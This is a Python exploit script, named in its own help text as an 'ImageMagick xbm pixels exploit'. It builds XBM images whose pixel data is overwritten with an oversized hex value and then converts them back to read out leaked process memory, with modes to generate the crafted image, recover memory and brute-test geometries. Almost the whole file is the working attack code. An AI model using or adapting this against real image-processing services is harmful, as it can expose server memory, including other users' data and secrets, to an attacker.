#!/usr/bin/env python
import subprocess
import random
import string
import argparse
import sys
import re
from pprint import pprint

if sys.version_info[0] == 3:
    BIN_STDIN = sys.stdin.buffer
    BIN_STDOUT = sys.stdout.buffer
else:
    BIN_STDIN = sys.stdin
    BIN_STDOUT = sys.stdout

def geometry(geometry):
    try:
        w, h = map(int, geometry.split('x'))
    except:
        raise ValueError("Wrong geometry format: {}".format(geometry))
    return (w, h)

def load_pixels(w, h, data):
    pixels = ''
    lines = data.splitlines()
    for i in xrange(3,len(lines)):
        bytes_array = lines[i].split(',')
        for b in bytes_array:
            s = b.strip()
            s = s[2:]
            pixels += (bytearray.fromhex(s))
    return pixels

def load_picture(pict_data, tool='IM', picture_index=0):
    assert tool in ('GM', 'IM')
    if tool == 'GM':
        prefix = ['gm']
    else:
        prefix = []

    identify = subprocess.Popen(prefix + ['identify', '-format', '%w %h', '-[{}]'.format(picture_index)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = identify.communicate(pict_data)
    assert identify.returncode == 0, 'identify failed'
    w, h = map(int, stdout.decode('utf8').split())
    convert = subprocess.Popen(prefix + ['convert','-[{}]'.format(picture_index), 'XBM:-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = convert.communicate(pict_data)
    assert convert.returncode == 0, 'convert failed'
    pixels = load_pixels(w, h, stdout)
    return pixels

def inject_payload(pict_data):
    lines = pict_data.splitlines()
    assert len(lines) > 3, 'bad file'
    overflow = random.randint(134217728,214748364)
    payload = "0x%x0" % overflow
    newline= re.sub('0x[0-9A-F]+', payload , lines[3])
    lines[3] = newline
    result = ''
    for l in lines:
        result += l + '\n'
    return result

def gen_dumping_xbm(w, h, tool='IM'):
    assert tool in ('GM', 'IM')
    if tool == 'GM':
        prefix = ['gm']
    else:
        prefix = []

    convert = subprocess.Popen(prefix + ['convert','-size','{}x{}'.format(w,h), 'canvas:black', 'XBM:-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = convert.communicate()
    assert convert.returncode == 0, 'convert failed'
    pict_data = bytearray(stdout)
    pict_data = inject_payload(pict_data)
    return pict_data

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ImageMagick xbm pixels exploit")
    parser.add_argument('--tool', choices=['GM', 'IM'], default='IM', help='tool for internal conversion operations (default: IM)')

    subparsers = parser.add_subparsers(dest='cmd')
    subparsers.required = True

    recover_parser = subparsers.add_parser('recover', help='recover memory from converted image')
    recover_parser.add_argument('input_filename', help='input file (\'-\' for stdin). geometry must match the original gif (generated via "gen" command). jpeg works very bad')
    recover_parser.add_argument('output_filename', default='-', help='where to save the result', nargs='?')

    gen_parser = subparsers.add_parser('gen', help='generate test')
    gen_parser.add_argument('geometry', help="geometry of the picture (WxH), max geometry with step 1", type=geometry)
    gen_parser.add_argument('output_filename', help="where to save the result ('-' for stdout)", default='-', nargs='?')

    recover_test = subparsers.add_parser('recover_test', help='test recovery')
    recover_test.add_argument('geometry', help="max geometry of the picture (WxH)", type=geometry)
    recover_test.add_argument('output_filename', help="where to save the result ('-' for stdout)", default='-', nargs='?')


    args = parser.parse_args()

    if args.cmd == 'gen':
        w, h = args.geometry
        pict_data = gen_dumping_xbm(w, h, args.tool)
        if args.output_filename == '-':
            BIN_STDOUT.write(pict_data)
        else:
            with open(args.output_filename, 'wb') as f:
                f.write(pict_data)

    if args.cmd == 'recover':
        if args.input_filename == '-':
            pict_data = BIN_STDIN.read()
        else:
            with open(args.input_filename, 'rb') as f:
                pict_data = f.read()

        pixels = load_picture(pict_data, tool=args.tool)
        print pixels

    if args.cmd == 'recover_test':
        w, h = args.geometry
        pixbust = {}
        for x in range(0,w+1,8):
            for y in range(0,h+1,8):
                pict_data = gen_dumping_xbm(x, y, args.tool)
                pixels = load_picture(pict_data, tool=args.tool)
                pixbust['{}x{}'.format(x,y)] = pixels
        for k, v in pixbust.iteritems():
            if args.output_filename == '-':
                BIN_STDOUT.write('{} : {}\n---\n'.format(k,v))
            else:
                with open(args.output_filename, 'ab') as f:
                    f.write('{} : {}\n---\n'.format(k,v))
                







 